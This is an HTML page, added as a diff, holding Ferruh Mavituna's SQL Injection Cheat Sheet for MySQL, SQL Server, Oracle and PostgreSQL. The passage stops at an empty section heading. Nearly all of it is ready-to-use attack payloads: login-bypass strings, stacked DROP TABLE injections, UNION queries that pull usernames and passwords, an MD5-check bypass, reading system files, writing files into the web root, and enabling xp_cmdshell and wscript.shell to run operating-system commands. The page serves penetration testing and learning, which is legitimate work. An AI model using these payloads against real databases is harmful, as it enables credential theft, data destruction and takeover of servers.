@@ -1,0 +1,910 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+
+<title>SQL Injection Cheat Sheet</title>
+<meta http-equiv="content-type" content="application/xhtml+xml; charset=utf-8" />
+<meta name="robots" content="index, follow" />
+<meta name="description" content="Ferruh Mavituna' nın Güvenlik, İnternet Teknolojileri, Yazılım Geliştirme ve benzer konular üzerine yazdığı mekan" />
+<meta name="keywords" content="english,web,uygulamasi,guvenligi,web,application,security,security,sql,injection," />
+<meta name="author" content="Ferruh Mavituna" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="stylesheet" href="/css/fm.css" media="screen" type="text/css" />
+
+<link rel="stylesheet" type="text/css" href="/js/editor/skins/simple/style.css" />
+<link rel="stylesheet" type="text/css" href="/js/editor/sets/default/style.css" />
+
+<link rel="alternate" href="/rss/" title="RSS Feed" type="application/rss+xml" />
+<link rel="alternate" href="/rss/comments/" title="Yorumlar RSS Feed" type="application/rss+xml" />
+
+<script src="/js/jquery.js" type="text/javascript"></script>
+<script src="/js/fmv3.js" type="text/javascript"></script>
+<script src="/js/searchhighlight.js" type="text/javascript"></script>
+
+
+</head>
+<body>
+<div id="container">
+	<div id="header">
+		<a href="/"><img src="/mg/fm.gif" width="146" height="65" alt="Ferruh Mavituna Logo" /></a>
+	</div>
+	<div id="wrapper">       
+        <div class="navtoggle"><a style="text-decoration:none" href="javascript:;" class="jnavigation"><img src="/mg/icons/hide.gif" width="17" height="16" class="abs" alt="" /> Men&#252;y&#252; Gizle</a></div>
+		<div id="content">
+		<div class="ad" style="float:none;width:100%;text-align:center;margin-bottom:10px">
+			<a href="http://www.guvenlikegitimleri.com/new/web-application-pentest-egitimi-22-mayis-2010"><img src="/mg/ad/web_egitimi.gif" /></a>
+		</div>
+<div class="blog" id="blogsql-injection-cheatsheet">   
+    <h1><a href="/sql-injection-cheatsheet-oku/">SQL Injection Cheat Sheet</a></h1>
+    <div class="tags"> 
+        <img class="abs" src="/mg/icons/tag_blue.png" width="16" height="16" alt="Etiketler" />
+        <a href="/tag/sql+injection/" class="tag">sql injection</a>, <a href="/tag/security/" class="tag">security</a>, <a href="/tag/web+application+security/" class="tag">web application security</a>, <a href="/tag/web+uygulamasi+guvenligi/" class="tag">web uygulamasi guvenligi</a>, <a href="/tag/english/" class="tag">english</a>,  <span class="date">15.03.2007</span>
+    </div>
+<!--<div style="float:right"><script type="text/javascript" src="http://yakutum.pasaj.com/widgetjs"></script></div>-->
+    <div class="post"><p> </p>  <h2><em>Find and exploit SQL Injections with <a href="http://www.mavitunasecurity.com/">Netsparker, Next Generation Web Application Security Scanner</a></em></h2>  <p> </p>  <p><em>SQL Injection Cheat Sheet, <strong>Document Version 1.4</strong></em></p>  <h2><a id="about" name="about"></a>About SQL Injection Cheat Sheet </h2>  <p>Currently only for <strong>MySQL</strong> and <strong>Microsoft SQL Server, </strong>some <strong>ORACLE</strong> and some <strong>PostgreSQL</strong>. Most of samples are not correct for every single situation. Most of the real world environments may change because of parenthesis, different code bases and unexpected, strange SQL sentences.     <br />    <br />Samples are provided to allow reader to get basic idea of a potential attack and almost every section includes a brief information about itself. </p>  <table  cellspacing="3" cellpadding="3"><tbody>     <tr>       <td align="right"><strong>M : </strong></td>        <td>MySQL </td>     </tr>      <tr>       <td align="right"><strong>S : </strong></td>        <td>SQL Server</td>     </tr>      <tr>       <td align="right"><strong>P : </strong></td>        <td>PostgreSQL</td>     </tr>      <tr>       <td align="right"><strong>O : </strong></td>        <td>Oracle</td>     </tr>      <tr>       <td align="right"><strong>+ : </strong></td>        <td>Possibly all other databases </td>     </tr>   </tbody></table>  <h5><em><strong>Examples;</strong></em></h5>  <ul>   <li><em>(MS) means : MySQL and SQL Server etc. </em></li>    <li>(M*S) means : Only in some versions of MySQL or special conditions see related note and SQL Server </li> </ul>  <h2><a id="TOC" name="TOC"></a>Table Of Contents </h2>  <ol>   <li><a href="#about">About SQL Injection Cheat Sheet </a></li>    <li><a href="#SyntaxBasicAttacks">Syntax Reference, Sample Attacks and Dirty SQL Injection Tricks </a>      <ol>       <li><a href="#LineComments">Line Comments </a>          <ul>           <li><a href="#LineCommentAttacks">SQL Injection Attack Samples</a> </li>         </ul>       </li>        <li><a href="#InlineComments">Inline Comments </a>          <ul>           <li><a href="#InlineSamples">Classical Inline Comment SQL Injection Attack Samples</a> </li>            <li><a href="#MySQLInlineSamples">MySQL Version Detection Sample Attacks</a> </li>         </ul>       </li>        <li><a href="#StackingQueries">Stacking Queries</a>           <ul>           <li><a href="#LangDbFigure">Language / Database Stacked Query Support Table </a></li>            <li><a href="#AboutMySQLandPHP">About MySQL and PHP</a> </li>            <li><a href="#StackedSamples">Stacked SQL Injection Attack Samples</a> </li>         </ul>       </li>        <li><a href="#IfStatements">If Statements</a>           <ul>           <li><a href="#MySQLIf">MySQL If Statement</a> </li>            <li><a href="#SQLServerIf">SQL Server If Statement </a></li>            <li><a href="#SampleIfStatements">If Statement SQL Injection Attack Samples </a></li>         </ul>       </li>        <li><a href="#UsingIntegers">Using Integers </a></li>        <li><a href="#StringOperations">String  Operations</a>           <ul>           <li><a href="#StringConcat">String Concatenation </a></li>         </ul>       </li>        <li><a href="#StringwithoutQuotes">Strings without Quotes</a>           <ul>           <li><a href="#HexbasedSamples">Hex based SQL Injection Samples</a> </li>         </ul>       </li>        <li><a href="#StringModification">String Modification & Related </a></li>        <li><a href="#UnionInjections">Union Injections</a>           <ul>           <li><a href="#UnionLanguageIssues">UNION – Fixing Language Issues</a> </li>         </ul>       </li>        <li><a href="#ByPassingLoginScreens">Bypassing Login Screens</a> </li>        <li><a href="#Enablecmdshell">Enabling xp_cmdshell in SQL Server 2005 </a></li>        <li><em>Other parts are not so well formatted but check out by yourself, drafts, notes and stuff, scroll down and see. </em></li>     </ol>   </li> </ol>  <h2><a id="SyntaxBasicAttacks" name="SyntaxBasicAttacks"></a>Syntax Reference, Sample Attacks and Dirty SQL Injection Tricks </h2>  <h3 class="style2"><a id="21" name="21"></a>Ending / Commenting Out / Line Comments </h3>  <h4><a id="LineComments" name="LineComments"></a>Line Comments </h4>  <p class="idea"><strong>Comments out rest of the query.</strong>     <br />Line comments are generally useful for ignoring rest of the query so you don’t have to deal with fixing the syntax.</p>  <ul type="disc">   <li><code>-- </code>(SM)<code>        <br />DROP sampletable;<span class="hi">--</span>         <br />        <br /></code></li>    <li><code># </code>(M)<code>        <br />DROP sampletable;<span class="hi">#</span></code> </li> </ul>  <h5><a id="LineCommentAttacks" name="LineCommentAttacks"></a>Line Comments Sample SQL Injection Attacks</h5>  <ul type="disc">   <li><span class="inputfield">Username:</span><code> admin<span class="hi">'--</span> </code></li>    <li><code>SELECT * FROM members WHERE username = '<span class="hi">admin'--</span><span class="comment">' AND password = 'password'</span>         <br /></code><span class="idea">This is going to log you as admin user, because rest of the SQL query will be ignored.</span> </li> </ul>  <h4><a id="InlineComments" name="InlineComments"></a>Inline Comments</h4>  <p class="idea"><strong>Comments out rest of the query by not closing them</strong> or you can use for <strong>bypassing blacklisting</strong>, removing spaces, obfuscating and determining database versions.</p>  <ul type="disc">   <li><code>/*Comment Here*/</code> (SM)       <ul>       <li><code>DROP<span class="hi">/*comment*/</span>sampletable</code> </li>        <li><code>DR<span class="hi">/**/</span>OP<span class="hi">/*bypass blacklisting*/</span>sampletable</code> </li>        <li><code>SELECT<span class="hi">/*avoid-spaces*/</span>password<span class="hi">/**/</span>FROM<span class="hi">/**/</span>Members</code>           <br />          <br /></li>     </ul>   </li>    <li><code>/*! MYSQL Special SQL *</code>/ (M)       <br /><span class="idea">This is a special comment syntax for MySQL. It’s perfect for detecting MySQL version. If you put a code into this comments it’s going to execute in MySQL only. Also you can use this to execute some code only if the server is higher than supplied version.</span>       <br />      <br /><code>SELECT <span class="hi">/*!<strong>32302</strong> 1/0, */</span> 1 FROM tablename</code> </li> </ul>  <h5><a id="InlineSamples" name="InlineSamples"></a>Classical Inline Comment SQL Injection Attack Samples </h5>  <ul type="disc">   <li><span class="inputfield">ID:</span> <code>10; DROP TABLE members <span class="hi">/*</span></code>       <br /><span class="idea">Simply get rid of other stuff at the end the of query. Same as <code>10; DROP TABLE members <span class="hi">--</span></code></span>       <br />      <br /></li>    <li><code>SELECT <span class="hi">/*!<strong>32302</strong> 1/0, */</span> 1 FROM tablename</code>       <br /><span class="idea">Will throw an <strong>divison by 0 error </strong>if MySQL version is higher than <strong>3.23.02</strong></span> </li> </ul>  <h5><a id="MySQLInlineSamples" name="MySQLInlineSamples"></a>MySQL Version Detection Sample Attacks</h5>  <ul type="disc">   <li><span class="inputfield">ID:</span> <span class="hi"><code>/*!</code></span><code><strong>32302</strong> 10<span class="hi">*/</span> </code></li>    <li><span class="inputfield">ID:</span> <code>10</code>       <br /><span class="idea">You will get the <strong>same response</strong> if MySQL version is higher than <strong>3.23.02</strong></span>       <br />      <br /></li>    <li><code>SELECT <span class="hi">/*!<strong>32302</strong> 1/0, */</span> 1 FROM tablename</code>       <br /><span class="idea">Will throw an <strong>divison by 0 error </strong>if MySQL version is higher than <strong>3.23.02</strong></span> </li> </ul>  <h3><a id="StackingQueries" name="StackingQueries"></a>Stacking Queries </h3>  <p class="idea"><strong>Executing more than one query in one transaction</strong>. This is very useful in every injection point, especially in SQL Server back ended applications. </p>  <ul type="disc">   <li><code>;</code> (S)       <br /><code>SELECT * FROM members<span class="hi">; DROP members--</span></code> </li> </ul>  <p class="idea">Ends a query and starts a new one.</p>  <h4><a id="LangDbFigure" name="LangDbFigure"></a>Language / Database Stacked Query Support Table </h4>  <p class="idea"><strong>green:</strong> supported, <strong>dark gray:</strong> not supported, <strong>light gray: </strong>unknown </p>  <table  cellspacing="1" cellpadding="5" bgcolor="#cccccc"><tbody>     <tr>       <td class="style3" bgcolor="#f7f7f7"> </td>        <td bgcolor="#ffffff"><strong>SQL Server </strong></td>        <td bgcolor="#ffffff"><strong>MySQL</strong></td>        <td bgcolor="#ffffff"><strong>PostgreSQL</strong></td>        <td bgcolor="#ffffff"><strong>ORACLE</strong></td>        <td bgcolor="#ffffff"><strong>MS Access </strong></td>     </tr>      <tr>       <td bgcolor="#ffffff"><strong>ASP</strong></td>        <td bgcolor="#99cc00"> </td>        <td class="style3" bgcolor="#f7f7f7"> </td>        <td class="style3" bgcolor="#f7f7f7"> </td>        <td class="style3" bgcolor="#f7f7f7"> </td>        <td bgcolor="#333333"> </td>     </tr>      <tr>       <td bgcolor="#ffffff"><strong>ASP.NET</strong></td>        <td bgcolor="#99cc00"> </td>        <td class="style3" bgcolor="#f7f7f7"> </td>        <td class="style3" bgcolor="#f7f7f7"> </td>        <td class="style3" bgcolor="#f7f7f7"> </td>        <td bgcolor="#333333"> </td>     </tr>      <tr>       <td bgcolor="#ffffff"><strong>PHP</strong></td>        <td bgcolor="#99cc00"> </td>        <td bgcolor="#333333"> </td>        <td class="style3" bgcolor="#99cc00"> </td>        <td class="style3" bgcolor="#f7f7f7"> </td>        <td bgcolor="#333333"> </td>     </tr>      <tr>       <td bgcolor="#ffffff"><strong>Java</strong></td>        <td class="style3" bgcolor="#f7f7f7"> </td>        <td class="style3" bgcolor="#f7f7f7"> </td>        <td class="style3" bgcolor="#f7f7f7"> </td>        <td bgcolor="#333333"> </td>        <td bgcolor="#333333"> </td>     </tr>   </tbody></table>  <p class="idea"> </p>  <p class="idea"><strong><a id="AboutMySQLandPHP" name="AboutMySQLandPHP"></a>About MySQL and PHP;</strong>     <br />To clarify some issues;     <br /><strong>PHP - MySQL doesn't support stacked queries</strong>, Java doesn't support stacked queries (<em>I'm sure for ORACLE, not quite sure about other databases</em>). <em>Normally MySQL supports stacked queries but because of database layer in most of the configurations it’s not possible to execute second query in PHP-MySQL applications or maybe MySQL client supports this, not quite sure. Can someone clarify?</em></p>  <h5><a id="StackedSamples" name="StackedSamples"></a>Stacked SQL Injection Attack Samples </h5>  <ul type="disc">   <li><span class="inputfield">ID:</span> <code>10;DROP members --</code> </li>    <li><code>SELECT * FROM products WHERE id = 10<span class="hi">; DROP members--</span></code> </li> </ul>  <p class="idea">This will run <em>DROP members</em> SQL sentence after normal SQL Query.     <br /></p>  <h3><a id="IfStatements" name="IfStatements"></a>If Statements </h3>  <p class="idea">Get response based on a if statement. This is <strong>one of the key points of Blind SQL Injection</strong>, also can be very useful to test simple stuff blindly and <strong>accurately</strong>.</p>  <h4><a id="MySQLIf" name="MySQLIf"></a>MySQL If Statement</h4>  <ul>   <li><code>IF(<strong><em>condition</em>,<em>true-part</em>,<em>false-part</em></strong>) </code>(M)<code>        <br />SELECT IF(1=1,'true','false')</code> </li> </ul>  <h4><a id="SQLServerIf" name="SQLServerIf"></a>SQL Server If Statement </h4>  <ul>   <li><code>IF <strong><em>condition</em></strong> <strong><em>true-part</em></strong> ELSE <strong><em>false-part</em></strong></code> (S)       <br /><code>IF (1=1) SELECT 'true' ELSE SELECT 'false'</code> </li> </ul>  <h5><a id="SampleIfStatements" name="SampleIfStatements"></a>If Statement SQL Injection Attack Samples </h5>  <p><code>if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0</code> (S)     <br /><span class="idea">This will throw an <strong>divide by zero error</strong> if current logged user is not <strong>"sa" or "dbo"</strong>.</span></p>  <h3><a id="UsingIntegers" name="UsingIntegers"></a>Using Integers </h3>  <p class="idea">Very useful for bypassing, <strong>magic_quotes() and similar filters</strong>, or even WAFs. </p>  <ul type="disc">   <li><code>0x<em>HEXNUMBER</em></code> (SM)       <br /><span class="idea">You can  write hex like these;</span>       <br />      <br /><code>SELECT CHAR(0x66)</code> (S)       <br /><code>SELECT 0x5045</code> <span class="idea">(<em>this is not an integer it will be a string from Hex</em>)</span> (M)       <br /><code>SELECT 0x50 + 0x45</code> <span class="idea">(<em>this is integer now!</em>)</span> (M) </li> </ul>  <h3><a id="StringOperations" name="StringOperations"></a>String  Operations </h3>  <p class="idea">String related operations. These can be quite useful to build up injections which are not using any quotes, bypass any other black listing or determine back end database.</p>  <h4><a id="StringConcat" name="StringConcat"></a>String Concatenation </h4>  <ul type="disc">   <li><code>+</code> (S)       <br /><code>SELECT login <span class="hi">+ '-' +</span> password FROM members</code>       <br />      <br /></li>    <li><code>||</code> (*MO)       <br /><code>SELECT login <span class="hi">|| '-' ||</span> password FROM members </code></li> </ul>  <p class="idea"><strong>*About MySQL "||";</strong>     <br />If MySQL is running in ANSI mode it’s going to work but otherwise MySQL accept it as `logical operator` it’ll return 0. Better way to do it is using <code>CONCAT()</code> function in MySQL.</p>  <ul type="disc">   <li><code>CONCAT(str1, str2, str3, ...)</code> (M)       <br /><span class="idea">Concatenate supplied strings.</span>       <br /><code>SELECT <span class="hi">CONCAT(login, password)</span> FROM members</code> </li> </ul>  <h3><a id="StringwithoutQuotes" name="StringwithoutQuotes"></a>Strings without Quotes </h3>  <p class="idea">These are some direct ways to using strings but it’s always possible to use <code>CHAR()</code>(MS) and <code>CONCAT()</code>(M) to generate string without quotes.</p>  <ul type="disc">   <li><code>0x457578</code> (M) - <span class="idea">Hex Representation of string </span>      <br /><code>SELECT 0x457578</code>       <br /><span class="idea">This will be selected as string in MySQL.</span>       <br />      <br /><span class="idea">In MySQL easy way to generate hex representations of strings use this;</span>       <br /><code>SELECT CONCAT('0x',HEX('c:\\boot.ini'))</code>       <br />      <br /></li>    <li><span class="idea">Using <code>CONCAT()</code> in MySQL</span>       <br /><code>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))</code> (M)       <br /><span class="idea">This will return ‘KLM’.</span>       <br />      <br /></li>    <li><code>SELECT CHAR(75)+CHAR(76)+CHAR(77)</code> (S)       <br /><span class="idea">This will return ‘KLM’. </span></li> </ul>  <h4><a id="HexbasedSamples" name="HexbasedSamples"></a>Hex based SQL Injection Samples</h4>  <ul>   <li><code>SELECT LOAD_FILE(<span class="hi">0x633A5C626F6F742E696E69</span>)</code> (M)       <br /><span class="idea">This will show the content of <strong>c:\boot.ini</strong></span> </li> </ul>  <h3><a id="StringModification" name="StringModification"></a>String Modification & Related </h3>  <ul type="disc">   <li><code>ASCII()</code> (SMP)       <br /><span class="idea">Returns ASCII character value of leftmost character. A must have function for Blind SQL Injections.</span>       <br />      <br /><code>SELECT ASCII('a')</code>       <br />      <br /></li>    <li><code>CHAR()</code> (SM)       <br /><span class="idea">Convert an integer of ASCII.</span>       <br />      <br /><code>SELECT CHAR(64)</code> </li> </ul>  <h2><a id="UnionInjections" name="UnionInjections"></a>Union Injections</h2>  <p class="idea">With union you do SQL queries cross-table. Basically you can poison query to return records from another table. </p>  <p><code>SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members </code>    <br /><span class="idea">This will combine results from both news table and members table and return all of them. </span></p>  <p><span class="idea">Another Example : </span>    <br /><code>' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</code></p>  <h3><a id="UnionLanguageIssues" name="UnionLanguageIssues"></a>UNION – Fixing Language Issues</h3>  <p class="idea">While exploiting Union injections sometimes you get errors because of different language settings (<em>table settings, field settings, combined table / db settings etc.</em>) these functions are quite useful to fix this problem. It's rare but if you dealing with <em>Japanese, Russian, Turkish</em> etc. applications then you will see it. </p>  <ul>   <li>SQL Server (S)      <br />Use <span class="hi"><code>field</code> <strong><code>COLLATE</code></strong><code> SQL_Latin1_General_Cp1254_CS_AS</code></span> or some other valid one - <em>check out SQL Server documentation</em>.       <br />      <br /><code>SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members</code>       <br />      <br /></li>    <li>MySQL (M)      <br /><code>Hex() </code><span class="idea">for every possible issue</span> </li> </ul>  <h3><a id="ByPassingLoginScreens" name="ByPassingLoginScreens"></a>Bypassing Login Screens (SMO+) </h3> <span class="idea"><em>SQL Injection 101</em>, Login tricks </span>  <ul>   <li><code>admin' -- </code></li>    <li><code>admin' # </code></li>    <li><code>admin'/*</code> </li>    <li><code>' or 1=1--</code> </li>    <li><code>' or 1=1#</code> </li>    <li><code>' or 1=1/*</code> </li>    <li><code>') or '1'='1--</code> </li>    <li><code>') or ('1'='1--</code> </li>    <li>.... </li> </ul>  <ul>   <li>Login as different user (SM*)      <br /><code>' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</code> </li> </ul>  <p><em>*Old versions of MySQL doesn't support union queries </em></p>  <h3><a id="UnionLanguageIssues" name="UnionLanguageIssues"></a>Bypassing second MD5 hash check login screens </h3>  <p class="idea">If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database. </p>  <h4><a id="BypassingMD5Hash" name="BypassingMD5Hash"></a>Bypassing MD5 Hash Check Example (MSP) </h4>  <p><span class="inputfield">Username :</span><code> admin</code>     <br /><span class="inputfield">Password :</span> <code>1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055</code></p>  <p><code>81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234) </code></p>  <h3> </h3>  <h3>Error Based - Find Columns Names </h3>  <h4>Finding Column Names with <strong>HAVING BY</strong> - Error Based (S) </h4>  <p><em>In the same order, </em></p>  <ul>   <li>'<code> HAVING 1=1 -- </code></li>    <li><code>' GROUP BY <strong class="hi">table.columnfromerror1</strong> HAVING 1=1 -- </code></li>    <li><code>' GROUP BY <strong class="hi">table.columnfromerror1, columnfromerror2</strong> HAVING 1=1 --</code> </li>    <li><code>' GROUP BY <strong class="hi">table.columnfromerror1, columnfromerror2, columnfromerror(n) </strong>HAVING 1=1 --</code> <em>and so on</em> </li>    <li>If you are not getting any more error then it's done. </li> </ul>  <h4>Finding how many columns in SELECT query by <strong>ORDER BY</strong> <strong>(MSO+)</strong></h4>  <p>Finding column number by ORDER BY can speed up the UNION SQL Injection process.</p>  <ul>   <li><code>ORDER BY 1-- </code></li>    <li><code>ORDER BY 2--</code> </li>    <li><code>ORDER BY N--</code> <em>so on</em> </li>    <li>Keep going until get an error. Error means you found the number of selected columns. </li> </ul>  <h3>Data types, UNION, etc. </h3>  <h4>Hints,</h4>  <ul>   <li>Always use <strong>UNION</strong> with <strong>ALL </strong>because of <strong>image</strong> similiar non-distinct field types. By default union tries to get records with distinct. </li>    <li>To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (<em>if injection is in WHERE</em>). This can be critical if you are only getting one result at a time. </li>    <li>Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc.      <ul>       <li>Be careful in Blind situtaions may you can understand error is coming from DB or application itself. Because languages like ASP.NET generally throws errors while trying to use NULL values (<em>because normally developers are not expecting to see NULL in a username field</em>) </li>     </ul>   </li> </ul>  <h4>Finding Column Type </h4>  <ul>   <li><code>' union select <span class="hi">sum(<strong>columntofind</strong>)</span> from <strong>users</strong>--</code> (S)       <br /><code>Microsoft OLE DB Provider for ODBC Drivers error '80040e07'        <br />[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a <strong class="hi">varchar</strong> data type as an argument.</code>       <br />      <br /><em>If you are not getting error it means </em>column is numeric.       <br />      <br /></li>    <li>Also you can use <span class="hi">CAST()</span> or <span class="hi">CONVERT()</span>       <ul>       <li><code>SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--</code>           <br />          <br /></li>     </ul>   </li>    <li><code>11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-</code>       <br />No Error - Syntax is right. MS SQL Server Used. Proceeding.       <br />      <br /></li>    <li><code>11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-</code>       <br />No Error – First column is an integer.       <br />      <br /></li>    <li><code>11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 -- </code>      <br />Error! – Second column is not an integer.       <br />      <br /></li>    <li><code>11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-</code>       <br />No Error – Second column is a string.       <br />      <br /></li>    <li><code>11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-</code>       <br />Error! – Third column is not an integer. ...       <br />      <br /><code>Microsoft OLE DB Provider for SQL Server error '80040e07'        <br />Explicit conversion from data type <span class="hi"><strong>int</strong> to image</span> is not allowed.</code> </li> </ul>  <p><strong>You’ll get convert() errors before union target errors ! </strong>So<strong> </strong>start with<strong> </strong>convert() then union<strong></strong></p>  <h3>Simple Insert (MSO+) </h3> <code>'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*</code>   <h3>Useful Function / Information Gathering / Stored Procedures / Bulk SQL Injection Notes</h3>  <p><strong>@@version</strong> (MS)     <br />Version of database and more details for SQL Server. It's a constant. You can just select it like any other column, you don't need to supply table name. Also you can use insert, update statements or in functions. </p>  <p><code>INSERT INTO members(id, user, pass) VALUES(1, ''+<span class="hi">SUBSTRING(@@version,1,10)</span> ,10)</code></p>  <h4><a id="BulkInsert" name="BulkInsert"></a>Bulk Insert (S) </h4>  <p>Insert a file content to a table. If you don't know internal path of web application you can <strong>read IIS (</strong><em>IIS 6 only</em><strong>) metabase file </strong>(<em>%systemroot%\system32\inetsrv\MetaBase.xml</em>) and then search in it to identify application path. </p>  <ol>   <ol>     <li>Create table foo( line varchar(8000) ) </li>      <li>bulk insert foo from 'c:\inetpub\wwwroot\login.asp' </li>      <li><em>Drop temp table, and repeat for another file. </em></li>   </ol> </ol>  <h4>BCP (S) </h4>  <p>Write text file. Login Credentials are required to use this function.    <br /><code>bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar </code></p>  <h4>VBS, WSH in SQL Server (S) </h4>  <p>You can use VBS, WSH scripting in SQL Server because of ActiveX support. </p>  <p><code>declare @o int      <br />exec sp_oacreate 'wscript.shell', @o out       <br />exec sp_oamethod @o, 'run', NULL, 'notepad.exe'       <br /></code><code><em>Username:</em> '; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' --       <br /></code></p>  <h4>Executing system commands, xp_cmdshell (S) </h4>  <p>Well known trick, By default it's disabled in <em>SQL Server 2005. </em>You need to have admin access. </p>  <p><code>EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'</code>     <br /></p>  <p>Simple ping check (<em>configure your firewall or sniffer to identify request before launch it</em>), </p>  <p><code>EXEC master.dbo.xp_cmdshell 'ping <ip address>'</code></p>  <p>You can not read results directly from error or union or something else. </p>  <h4>Some Special Tables in SQL Server (S) </h4>  <ul>   <li>Error Messages      <br /><code>master..sysmessages </code>      <br />      <br /></li>    <li>Linked Servers      <br /><code>master..sysservers</code>       <br />      <br /></li>    <li>Password (<em>2000 and 20005 both can be crackable, they use very similar hashing algorithm </em>)       <br />SQL Server 2000:<code> masters..sysxlogins</code>       <br />SQL Server 2005 : <code>sys.sql_logins        <br /></code></li> </ul>  <h4>More Stored Procedures for SQL Server (S) </h4>  <ol>   <li>Cmd Execute (<strong>xp_cmdshell</strong>)       <br />exec master..xp_cmdshell 'dir'       <br />      <br /></li>    <li>Registry Stuff (<strong>xp_regread</strong>)       <br />      <ol>       <li>xp_regaddmultistring </li>        <li>xp_regdeletekey </li>        <li>xp_regdeletevalue </li>        <li>xp_regenumkeys </li>        <li>xp_regenumvalues </li>        <li>xp_regread </li>        <li>xp_regremovemultistring </li>        <li>xp_regwrite          <br />exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'           <br />exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'           <br />          <br /></li>     </ol>   </li>    <li>Managing Services (<strong>xp_servicecontrol</strong>)       <br /></li>    <li>Medias (<strong>xp_availablemedia</strong>)       <br /></li>    <li>ODBC Resources (<strong>xp_enumdsn</strong>)       <br /></li>    <li>Login mode (<strong>xp_loginconfig</strong>)       <br /></li>    <li>Creating Cab Files (<strong>xp_makecab</strong>)       <br /></li>    <li>Domain Enumeration (<strong>xp_ntsec_enumdomains</strong>)       <br /></li>    <li>Process Killing (<em>need PID</em>) (<strong>xp_terminate_process</strong>)       <br /></li>    <li>Add new procedure (<em>virtually you can execute whatever you want</em>)       <br />sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’       <br />exec xp_webserver </li>    <li>Write text file to a UNC or an internal path (sp_makewebtask)      <br /></li> </ol>  <h4>MSSQL Bulk Notes </h4>  <p><code>SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/ </code></p>  <p><code>DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0</code></p>  <p>HOST_NAME()    <br />IS_MEMBER (Transact-SQL)  <br />IS_SRVROLEMEMBER (Transact-SQL)  <br />OPENDATASOURCE (Transact-SQL) </p>  <pre>INSERT tbl EXEC master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"</pre>
+
+<p>OPENROWSET (Transact-SQL)  - <a href="http://msdn2.microsoft.com/en-us/library/ms190312.aspx">http://msdn2.microsoft.com/en-us/library/ms190312.aspx</a></p>
+
+<p>You can not use sub selects in SQL Server Insert queries.</p>
+
+<h4>SQL Injection in LIMIT (M) or ORDER (MSO)</h4>
+
+<p><code>SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;</code></p>
+
+<p>If injection is in second <em>limit</em> you can comment it out or use in your union injection </p>
+
+<h4>Shutdown SQL Server (S)</h4>
+
+<p>When you really pissed off, <code>';shutdown -- </code></p>
+
+<h3><a id="Enablecmdshell" name="Enablecmdshell"></a>Enabling xp_cmdshell in SQL Server 2005 </h3>
+
+<p class="idea">By default xp_cmdshell and couple of other potentially dangerous stored procedures are disabled in SQL Server 2005. If you have admin access then you can enable these.</p>
+
+<p><code>EXEC sp_configure 'show advanced options',1 
+    <br />RECONFIGURE</code></p>
+
+<p><code>EXEC sp_configure 'xp_cmdshell',1 
+    <br />RECONFIGURE</code></p>
+
+<h3>Finding Database Structure in SQL Server (S) </h3>
+
+<h4>Getting User defined Tables</h4>
+
+<p><code>SELECT name FROM sysobjects WHERE xtype = 'U'</code></p>
+
+<h4>Getting Column Names</h4>
+
+<p><code>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')</code></p>
+
+<h3>Moving records (S)</h3>
+
+<ul>
+  <li>Modify WHERE and use <strong><code>NOT IN</code></strong> or <strong><code>NOT EXIST</code></strong>, 
+
+    <br /><code>... WHERE users NOT IN ('First User', 'Second User')</code> 
+
+    <br /><code class="hi">SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)</code> <em>-- very good one</em> 
+
+    <br />
+
+    <br /></li>
+
+  <li>Using Dirty Tricks 
+    <br /><code>SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id<=o.id) AS x, name from sysobjects o) as p where p.x=3) as int </code>
+
+    <br /><code>
+      <br />Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21</code> 
+
+    <br /></li>
+</ul>
+
+<p>  </p>
+
+<h3>Fast way to extract data from Error Based SQL Injections in SQL Server (S)</h3>
+
